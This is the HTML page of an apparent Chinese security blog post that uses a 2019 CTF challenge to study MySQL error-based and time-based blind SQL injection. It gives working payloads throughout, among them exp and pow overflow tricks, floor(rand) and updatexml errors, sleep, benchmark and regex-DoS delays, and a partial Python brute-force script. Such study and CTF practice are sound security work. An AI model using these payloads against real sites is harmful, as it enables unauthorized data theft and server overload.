@@ -1,0 +1,794 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Avatar.jpg">
+  <link rel="icon" href="/img/Avatar.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="因为2019全国信安大赛的“全宇宙最简单的SQL”这道题的注入，所以引发对报错注入的深入学习">
+  <meta name="author" content="corp0ra1">
+  <meta name="keywords" content="">
+  
+  <title>CTF引发的对报错注入的深入学习 - corp0ra1&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"corp0ra1.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a1a4ccab78dfa522556928ac810fa739","google":"G-4X9XV0H0D5","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="corp0ra1's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 60vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+    <div class="container">
+        <a class="navbar-brand" href="/">&nbsp;<strong>Corp0ra1's Blog</strong>&nbsp;</a>
+
+        <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+        <!-- Collapsible content -->
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul class="navbar-nav ml-auto text-center">
+                
+                    
+                        
+                            
+                                
+                                        <li class="nav-item">
+                                            <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+                                        </li>
+                                        
+                                            
+                    
+                        
+                            
+                                
+                                        <li class="nav-item">
+                                            <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+                                        </li>
+                                        
+                                            
+                    
+                        
+                            
+                                
+                                        <li class="nav-item">
+                                            <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+                                        </li>
+                                        
+                                            
+                    
+                        
+                            
+                                
+                                        <li class="nav-item">
+                                            <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+                                        </li>
+                                        
+                                            
+                    
+                        
+                            
+                                
+                                        <li class="nav-item">
+                                            <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+                                        </li>
+                                        
+                                            
+                                                
+                                                    <li class="nav-item" id="search-btn">
+                                                        <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+                                                    </li>
+                                                    
+                                                        
+                                                            <li class="nav-item" id="color-toggle-btn">
+                                                                <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+                                                            </li>
+                                                            
+                                                                <li class="nav-item">
+                                                                    <a class="nav-link" href="/atom.xml">
+                                                                        <i class="iconfont icon-rss"></i>
+                                                                    </a>
+                                                                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/tesla.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="CTF引发的对报错注入的深入学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-05-15 17:43" pubdate>
+        2019年5月15日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      55
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+    <div class="container-fluid nopadding-x">
+        <div class="row nomargin-x">
+            <div class="d-none d-lg-block col-lg-2"></div>
+            <div class="col-lg-8 nopadding-x-md">
+                <div class="container nopadding-x-md" id="board-ctn">
+                    <div class="py-5" id="board">
+                        <article class="post-content mx-auto">
+                            <!-- SEO header -->
+                            <h1 style="display: none">
+                                CTF引发的对报错注入的深入学习
+                            </h1>
+                            <div class="markdown-body">
+                                <h1 id="友情提示！"><a href="#友情提示！" class="headerlink" title="友情提示！"></a>友情提示！</h1><p>盲注：师傅整理的好全的哇！而且精！膜拜！！！！！<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170626?from=timeline">传送门</a></p>
+<p>因为2019全国信安大赛的“全宇宙最简单的SQL”这道题的注入，所以会偏向于报错注入，针对这道题比较多，没耐心的可以直接看置顶的那篇文章，师傅整理的很全</p>
+<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>对于版本小于5.0的MySQL数据库，以及部分有WAF干扰的版本大于5.0的MySQL数据库，你就无法轻易获得表名、列名。<br>在这种情况下，也许你会放弃，仅仅注入出数据库名字，证明漏洞存在就结束。<br>那么如何在不知道MySQL列名的情况下注入出数据？<a target="_blank" rel="noopener" href="https://nosec.org/home/detail/2245.html">传送门</a><br><strong>payload：</strong><br><del>-1’ union select 1,(select4from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)–</del><br>1‘ union select 1,(select a.4 from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)–<br><strong>解释</strong><br>一、 select 1,2,3,4,5,6 union select * from users 的意思大概是前面的123456形成表列的列名，后面select的结果集为表格中的内容</p>
+<blockquote>
+<ul>
+<li> mysql版本：5.7.26-0ubuntu0.18.04.1 ，基本算是我目前的最新版本</li>
+</ul>
+</blockquote>
+<ul>
+<li>  记得联合查询而且由于union的特性记得前后两个的列数要相同，前面select 12345的数字多少取决于后面有几列</li>
+<li>select出来的结果集之后必须加上别名a<br>  前面的不能仅仅是2或者是‘2’(上面的文章虽然’2’可以)，但是a.2会更加合适（当前别名不一定是a，你随意啦！）</li>
+<li>  limit 1,1的用法百度即可</li>
+</ul>
+<p>二、 <code>1 union select</code>后面为啥还要加个1?<br>不然会报错！因为这个地方前面的sql语句是user,password两列，union前后的列数要相同，1的目的就是为了充数。<br>如果前面是select user,password,age from where use=，此时你注入payload就应该是1,2，selectb巴拉巴拉的</p>
+<h1 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>①</strong><br>他只有数据库操作出错和用户名密码错误这两种状态，而我们传统的是结果正确或者错误这两个状态。这也就一定的困难</p>
+<blockquote>
+<p><del>我们如何判断我们输入正确了呢?</del><br>输入正确肯定返回结果啊<br>问题的核心在于：我们不知道密码，所以需要sql注入操作出密码！<br>我们原来的是sql，判断sql出来的字符x是否等于另一个我们已知的字符，然后返回结果，根据结果的01来逐个猜解字符<br>而这里：sql操作语法错误 返回数据库操作出错，sql操作语法正确，密码错误返回用户名密码出错<br>问题是我们的操作正确了，但是sql判断字符的结果是1还是0还是其他我们就无法根据返回结果判断<br><strong>思路</strong><br>我们在判断的结果外面在套一层东西，使得套之后达到的效果为：如果判断的结果为1，则使得数据库操作出错，如果为0，则sql操作正确使得用户名伙密码出错<br>然后根据这个绕一圈，多一个步骤的方法来获得和之前一样的效果</p>
+</blockquote>
+<p><strong>②</strong><br>经过测试：or被过滤无法从information_schema获取表名，字段等信息<br>同时也无法查看password这一列的信息</p>
+<blockquote>
+<p>补充：正则匹配字符串中的or，匹配到了就报错。password和information中都含有or这两个字母</p>
+</blockquote>
+<p>这个时候就可以用到一开始基础里面提到的方法</p>
+<h2 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h2><ol>
+<li>基于报错</li>
+<li>1 exp函数<br>利用<strong>exp函数的参数在大于709的情况下会导致sql语句执行失败</strong>，这样其实就找到了一种方法来利用服务端的两种不同回显来判断我们自定义表达式的真假。比如这个表达式是709 + c - ascii(‘a’)，让c初始化为126（最大可见字符），我们把它作为参数传给exp函数，这时sql语句必然是执行失败的，因为709 + 126 - ascii(‘a’) &gt; 709。然后我们不断的c–，直到c == ascii(‘a’)，那么就相当于exp(709 + c - c) == exp(709)，sql语句就会执行成功，这时的c就是ascii(a)，利用这种思路就可以进行盲注了</li>
+</ol>
+<blockquote>
+<p>payload:username=’^(select exp(~((select ( (( select c.b from (select 1 as a,2 as b,3 as d from user union select from user)c where a=’admin’ )) ))18446744073709551615)))#&amp;password=admin</p>
+<blockquote>
+<p>补充的payload：甲鱼学长是exp(10100乘以上述字符判断返回的01结果，10001&gt;709,1000*0&lt;&lt;709.他的脚本太骚了!!!Python占位符用的太灵活了以至于….</p>
+<blockquote>
+<p>payload = “1’ union select exp(8011(select %s)) +–+”<br>payloads = “ascii(substr((select group_concat(qaq.2) from (select 1,2 union select * from user)qaq),%d,1))=%d”<br>payloads = payload % payloads<br>datas = “”<br>string = “”<br>for x in range(3,50):<br>lens = 1000000<br>for j in range(127):<br>i = 127-j<br>datas = “”<br>data[“username”] = payloads % (x, i)<br>/#print(data[“username”])<br>for z in data.keys():<br>datass = z + “=” +data[z] + “&amp;”<br>datas += datass<br>s = requests.post(url, data=datas, headers=header, allow_redirects = False)<br>….</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p><strong>1.2 基于溢出的报错</strong><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kagari/p/10758155.html">传送门</a><br>～0:0取反之后就是最大数，最大数+1就溢出则sql操作失败<br><strong>payload</strong></p>
+<blockquote>
+<p>“‘ and (select (asciizhuangtait.2 from (select 1,2 fzhuangtaiSELECT * from user )t zhuangtai1),{i},1))={j})+~0)#”.zhuangtai</p>
+<blockquote>
+<p>i=i,j=j前面的i指的是该语句中的{1}，后面的是脚本中外面for循环循环变量递增的i。类似于{1}，format(1=i)，j同理</p>
+</blockquote>
+</blockquote>
+<p>还有：pow(9999，100)去乘以结果，这个表达式的值在 MYSQL 中已经超出 double 范围，会溢出<br>其他数学函数可以发挥想象！</p>
+<p><strong>1.3 骚操作</strong></p>
+<blockquote>
+<p>对我而言很新颖，求表哥轻喷</p>
+</blockquote>
+<p>由于and的特性:前面为假 则后面的不执行直接返回结果为假，前面为真才返回结果为真<br>and的短路骚操作<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4904">传送门</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190422203420-f3e098fc-64fa-1.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>payload:admin’^1 and substr((select 2 from (select 1,2 union select * from user)a limit 1,1),%d,1)=’%s’ and pow(9999,100)#” % (i,char)</p>
+<blockquote>
+<p>前面的语句正确，由于and就会执行下面的语句从而产生溢出报错。前面的语句错误后面的也就不会执行</p>
+</blockquote>
+</blockquote>
+<p>其实我觉得有问题，但是说不出来，感觉就是最后的结果是select xxx from xxx where 0？<br>还有这种语法？于是自己还是试验了一波</p>
+<p><strong>后续更新：</strong><br>找了下and,or的w3c官方解释<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/sql/sql_and_or.asp">传送门</a><br>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。<br>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。`</p>
+<p><strong>by the way</strong><br>除了and，IF()也不是说不行对吧！<br>IF（1/0，报错操作，0）</p>
+<ol start="2">
+<li> 基于时间延迟的时间盲注<br>虽然sleep包括BENCHMARK等函数也被过滤了。但是寻找其他的时延函数<br>然后还是和上面1.1的and一样，如果前面为真，则进行时延，为假则不进行时间延迟<br>正则DOS，效果类似于sleep：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4906#toc-7">传送门</a><blockquote>
+<p><code>payload:admin’^(select+(select b from (select 1 as a,2 as b from user where 1=2 union select from user) b) like’f1ag%’+and+concat(rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’))+RLIKE+’(a.)%2b(a.)%2b(a.)%2b(a.*)%2bb’)^’1’%3d’1#</code></p>
+<blockquote>
+<p>concat后面的巴拉巴拉的等同于sleep(5)的效果参考某次白帽大会的议题.<a target="_blank" rel="noopener" href="https://www.cesafe.com/3993.html">传送门</a><br>搜到上面的方法，进而让我引申出来了还有<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170626?from=timeline">笛卡尔积</a>的方法？excuse me？笛卡尔积：上面那个白帽大会的网页里也有说.<br>看了这个之后发现还有get_lock()加锁机制？长亭的pwnhub解释<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bDeztHrOF2S6wf_nBFVeOg">传送门</a><br>骚操作一个接一个<br>由于篇幅原因，根据我上面的网页，大家可以自行探索</p>
+</blockquote>
+</blockquote>
+</li>
+</ol>
+<h1 id="加餐"><a href="#加餐" class="headerlink" title="加餐"></a>加餐</h1><p><strong>floor报错注入也可以的</strong><br>核心在于：rand()，group by。这个组合在一起会发生化学反应<br>即产生ERROR 1062 (23000): Duplicate entry ” for key ‘name’的<a target="_blank" rel="noopener" href="https://www.fujieace.com/mysql/error-1062-23000-duplicate-entry.html">错误</a></p>
+<blockquote>
+<p>出现这个问题的原因就是“唯一索引”引起的！<br>而导致主键的键值重复的原因就是上面的两个函数的组合。</p>
+</blockquote>
+<p>上面两个关键词为什么可以产生这种化学反应呢？<br>解释参考下面三篇文章<br>浅显易懂<a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/8472323.html">传送门</a><br>进阶版<a target="_blank" rel="noopener" href="https://blog.51cto.com/chichu/2051375">传送门</a><br>深刻:很长，主要原因是图片插的有点多，初次看看结论即可<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xdans/p/5412468.html">传送门</a></p>
+<blockquote>
+<p>对上面的“深刻”这篇文章的总结：<br>0. 报错只和rand和order by有关</p>
+</blockquote>
+<ol>
+<li> 报错与(floor(rand(0)2)位置无关</li>
+<li> floor(rand(0)2)报错是有条件的，表的记录必须3条以上，而且在3条以上必定报错</li>
+<li> rand(0)*2以及floor()函数组合只是成功的几率更高（你也可以自己好找到更好的，比如乘以3，rand(996)？）</li>
+</ol>
+<p><strong>payload的总结：</strong><br>by the way：concat的作用是 使得插入表中的内容是”xxxxx1“和“xxxxxx0”，这样报错显示主键重复的也是”xxxxx1”，从而达到一般的sql注入效果（xxx为你想要得到的内容）<br>在此处你可以考虑比如在floor(rand(0)*2)后面乘以你想要判断的结果（0和1）进而实现逐字母的爆破</p>
+<h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>感谢Mads师傅的文章进而引发了我这一系列的爆炸性研究！<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4914">传送门</a></p>
+<hr>
+<hr>
+<p>后续对上述内容学习的补充</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>十多个:floor,updatexml(),extractvalue(),还有一个大综合<a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/63683187">传送门</a><br>大多数人习惯用floor,updatexml(),extractvalue(),其实还有很多函数会导致mysql报错并显示出数据<br>前面已经介绍过floor，这里会在拓展一些</p>
+<blockquote>
+<p>这些方法并不是所有版本通用，比较老的版本并没有这些函数</p>
+</blockquote>
+<h2 id="UpdateXml-和extractValue"><a href="#UpdateXml-和extractValue" class="headerlink" title="UpdateXml()和extractValue()"></a>UpdateXml()和extractValue()</h2><blockquote>
+<p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p>
+</blockquote>
+<h3 id="UpdateXml"><a href="#UpdateXml" class="headerlink" title="UpdateXml()"></a>UpdateXml()</h3><p><strong>payload</strong>:xxx/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</p>
+<blockquote>
+<p><strong>分析</strong>：concat()函数是将其连成一个字符串，而updatexml第二个参数需要的是Xpath格式的字符串，我们输入的显然不符合。故报错由此报错。因此不会符合XPATH_string的格式，从而出现格式错误，爆出敏感信息<br><strong>补充</strong>：0x7e的ASCII码,实为~ ,upadtexml()报错信息为特殊字符、字母及之后的内容,为了前面字母前面的数字等内容丢失,所以在开头连接一个特殊字符~<br>注意返回长度有限,均为32个字符长度。（PS：但是应对大多的已经足够）如果密码长度超过了32位就不会被显示出来。</p>
+</blockquote>
+<h3 id="extractValue"><a href="#extractValue" class="headerlink" title="extractValue()"></a>extractValue()</h3><p>payload:xxx/a.php?id=1 and extractvalue(null,concat(0x7e,(select @@datadir),0x7e));</p>
+<blockquote>
+<p>其他东西和updataxml一样</p>
+</blockquote>
+<h3 id="区别和联系"><a href="#区别和联系" class="headerlink" title="区别和联系"></a>区别和联系</h3><ul>
+<li>EXTRACTVALUE(XML_document, XPath_string);<ul>
+<li>  extractvalue(目标xml文档，xml路径)</li>
+<li>  从目标XML中返回包含所查询值的字符串</li>
+</ul>
+</li>
+<li>UPDATEXML(XML_document, XPath_string, new_value);<ul>
+<li>  updatexml(目标xml文档，xml路径，更新的内容)</li>
+<li>  更新文档中符合条件的节点的值</li>
+</ul>
+</li>
+</ul>
+<h3 id="七个葫芦娃"><a href="#七个葫芦娃" class="headerlink" title="七个葫芦娃"></a>七个葫芦娃</h3><ol>
+<li><p> exp():函数执行返回0,0取反产生溢出</p>
+<blockquote>
+<p>1 and exp(~(select * from(select user())a));</p>
+</blockquote>
+</li>
+<li><p> GeometryCollection()</p>
+<blockquote>
+<p>id = 1 AND GeometryCollection((select from (select from(select user())a)b))</p>
+</blockquote>
+</li>
+<li><p> polygon()</p>
+<blockquote>
+<p>id =1 AND polygon((select from(select from(select user())a)b))</p>
+</blockquote>
+</li>
+<li><p> multipoint()</p>
+<blockquote>
+<p>id = 1 AND multipoint((select from(select from(select user())a)b))</p>
+</blockquote>
+</li>
+<li><p> multilinestring()</p>
+<blockquote>
+<p>id = 1 AND multilinestring((select from(select from(select user())a)b))</p>
+</blockquote>
+</li>
+<li><p> linestring()</p>
+<blockquote>
+<p>id = 1 AND LINESTRING((select from(select from(select user())a)b))</p>
+</blockquote>
+</li>
+<li><p> multipolygon()</p>
+<blockquote>
+<p>id =1 AND multipolygon((select from(select from(select user())a)b))</p>
+</blockquote>
+</li>
+</ol>
+<p>貌似被修复了！！！至少在我的Ubuntu的5.7版本和虚拟机phpstudy的5.5版本无效，但是&lt;代码审计&gt;的书上，以及上面网页中实验有效。具体那个版本不得而知！<br>除了1.的exp函数，2~6函数都是几何类型的函数，原理和<strong>UpdateXml()和extractValue()差不多：都是基于类型的不匹配从而导致的出错。除了exp，剩下的能不能用看命TAT</strong></p>
+<h1 id="时间延迟"><a href="#时间延迟" class="headerlink" title="时间延迟"></a>时间延迟</h1><p>五种方法<a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=789">传送门</a></p>
+<h2 id="sleep函数"><a href="#sleep函数" class="headerlink" title="sleep函数"></a>sleep函数</h2><p>sleep函数说的很多了,大多都是 select * from user where id=1’and if(0,sleep(5),1);<br>但是我想补充一点，通过这种方法也可以间接猜解结果集的行数</p>
+<blockquote>
+<p>select sleep(1),name from animals</p>
+<blockquote>
+<p>即当后面有一个名字，sleep就执行一次，结果集越多，函数执行次数越多</p>
+</blockquote>
+</blockquote>
+<h2 id="benchmark函数"><a href="#benchmark函数" class="headerlink" title="benchmark函数"></a>benchmark函数</h2><p>benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式<br>比如：benchmark(10000000,md5(‘a’))，或者sha1,达到sleep一样的时间延迟效果</p>
+<blockquote>
+<p>由于对服务器性能的大量占用，会影响正常用户的使用，很容易被管理员检测到！</p>
+</blockquote>
+<h2 id="get-lock"><a href="#get-lock" class="headerlink" title="get_lock()"></a>get_lock()</h2><blockquote>
+<p>  在一个session中可以先锁定一个变量例如：select get_lock(‘do9gy’,1)<br>然后通过另一个session 再次执行get_lock函数 select get_lock(‘do9gy’,5),此时会产生5 秒的延迟，其效果类似于sleep(5)。</p>
+</blockquote>
+<p><strong>优点</strong>：延时精确可控，<br><strong>缺点</strong>：利用环境有限,需要开两个session测试<br>而且注意必须要是持久性的链接才可以，因为非持久链接，会导致前面get_lock的加锁，但是对下一个session无效<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bDeztHrOF2S6wf_nBFVeOg">pwnhub这道题</a>可以利用，因为使用了<strong>mysql_pconnect</strong>函数来连接数据库。</p>
+<p>既然有危害，那么为什么有的服务器会开持久链接？<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708144129.png" srcset="/img/loading.gif" lazyload alt="20190708144129.png"></p>
+<blockquote>
+<p>注意下他的总结：如果讲持久链接替换为非持久链接时，你自己payload脚本进行先进行第一次session加锁，由于非持久链接，二次session就无效了，此时脚本行为就发生改变了。因此get_lock函数利用环境有限！</p>
+</blockquote>
+<h2 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h2><p>进行多表合并，耗费较长时间，达到延时的效果</p>
+<blockquote>
+<p>SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</p>
+<blockquote>
+<p>对于information_schema而言三个就差不多了，太大了可能会导致超时。（我两个schema表0.36s返回结果9486400，三个就直接卡了几分钟还没出来，笔记本电扇嗡嗡响就暂时作罢，太耗资源了，9486400^3080太大了）<br>其他的表可以自由发挥</p>
+</blockquote>
+</blockquote>
+<p>为什么用schema表？其他表不可以吗？</p>
+<blockquote>
+<p>The injected query should not rely on user tables since in most cases the attacker will have no information about those yet. Queries presented in the following section rely on system tables. The execution time is essentially caused by the large number of lines returned.</p>
+<blockquote>
+<p>因为其他表不可知，而且执行的延迟时间取决于笛卡尔积的量，普通表的数量太小了….</p>
+</blockquote>
+</blockquote>
+<h3 id="正则DOS之RLIKE"><a href="#正则DOS之RLIKE" class="headerlink" title="正则DOS之RLIKE"></a>正则DOS之RLIKE</h3><p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p>
+<blockquote>
+<p><code>concat(rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’)) RLIKE ‘(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.*)+b’</code></p>
+</blockquote>
+<p>以上代码等同于 sleep(5)</p>
+<h3 id="关于heavy-query请求的补充说明"><a href="#关于heavy-query请求的补充说明" class="headerlink" title="关于heavy-query请求的补充说明"></a>关于heavy-query请求的补充说明</h3><p>对于笛卡尔积，正则ODS，benchamark都会导致服务器资源的占用，容易被管理员识别。<br>同时由于sql的优化机制，会将每次结果存起来，从而导致下次查询基本秒回，再者如果查询多次都错误，sql也会下次直接判断你错误而不执行函数<br>所以为了每次程序的正常执行，最好一次一个sql语句，比如次数4999变成4998依次类推</p>
+<blockquote>
+<p>As mentioned in the article about time-based attacks, the heavy query approach will have noticeable impacts on CPU and server resources usage. Whenever possible, try to inject a time delay that will not be CPU intensive and stick to standards techniques.<br>You must also be aware that the injected query will most likely be executed only once. The database optimizer will execute it, store its result and use the returned value(s) when testing the WHERE clause against each record. As you can guess, this is must faster than executing the query each time. It should be mentioned however that the query will not be executed if the optimizer detects that the WHERE clause is always false. To avoid any unexpected results you should always try to generate a WHERE clause that will be verified for at least one record.</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.sqlinjection.net/heavy-query/">http://www.sqlinjection.net/heavy-query/</a></p>
+</blockquote>
+</blockquote>
+<p>但是相比报错型注入，他不会被logs记录<br>同时补充上面他的缺点如下<br>一方面服务器载荷和网络速度对响应时间也会产生巨大的影响，因此你需要暂停足够时间以确保这些不确定因素影响到你最后的结果，另一方便延迟要在合理的时间之类，由于延迟时间的不可知性，注入就很苦难</p>
+<blockquote>
+<p>One main advantage of this technique is to have little to no impact on logs, especially when compared to error-based attacks. However, in situations where heavy queries or CPU intensive functions like MySQL’s BENCHMARK() must be used, chances are good that system administrators realize something is going on.<br>Another thing to consider is the length of the delay you inject. This is especially important when testing Web applications. The server load and the network speed may have a huge impact on the response time. You need to pause the query long enough to make sure these uncertain factors do not falsify your results. On the other hand, you want the delay to be short enough to test the application in a reasonable time. This becomes particularly difficult when no exact delay can be injected.</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.sqlinjection.net/time-based/">http://www.sqlinjection.net/time-based/</a></p>
+</blockquote>
+</blockquote>
+
+                            </div>
+                            
+                                <p class="note note-info">
+                                    
+                                                    本文最后更新于：
+                                                        2022年6月7日 晚上
+                                                            
+                                </p>
+                                
+                                    <hr>
+                                    <div>
+                                        <div class="post-metas mb-3">
+                                            
+                                                <div class="post-meta mr-3">
+                                                    <i class="iconfont icon-category"></i>
+                                                    
+                                                        <a class="hover-with-bg" href="/categories/%E6%8A%80%E6%9C%AF%E7%82%B9/">
+                                                            技术点
+                                                        </a>
+                                                        
+                                                </div>
+                                                
+                                                    
+                                                        <div class="post-meta">
+                                                            <i class="iconfont icon-tags"></i>
+                                                            
+                                                                <a class="hover-with-bg" href="/tags/CTF/">
+                                                                    CTF
+                                                                </a>
+                                                                
+                                                                <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                                                    靶场
+                                                                </a>
+                                                                
+                                                                <a class="hover-with-bg" href="/tags/XSS/">
+                                                                    XSS
+                                                                </a>
+                                                                
+                                                        </div>
+                                                        
+                                        </div>
+                                        
+                                            <p class="note note-warning">
+                                                
+                                                            本博客所有文章欢迎转载 ，但希望转载时能注明出处！ </br>关于文章，如有疑问，欢迎讨论！Email:corp0ra1@qq.com </br>如果图片无法显示:https://corp0ra1.github.io/common/imageLoad.html
+                                                                
+                                            </p>
+                                            
+                                                
+                                                    <div class="post-prevnext">
+                                                        <article class="post-prev col-6">
+                                                            
+                                                                
+                                                                    <a href="/2019/06/12/%5Bold%5Dsqli-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">
+                                                                        <i class="iconfont icon-arrowleft"></i>
+                                                                        <span class="hidden-mobile">sqli-labs靶场通关记录</span>
+                                                                        <span class="visible-mobile">上一篇</span>
+                                                                    </a>
+                                                                    
+                                                        </article>
+                                                        <article class="post-next col-6">
+                                                            
+                                                                
+                                                                    <a href="/2019/05/14/%5Bold%5Dupload-lab%E9%80%9A%E5%85%B3%E7%A7%98%E7%B1%8D/">
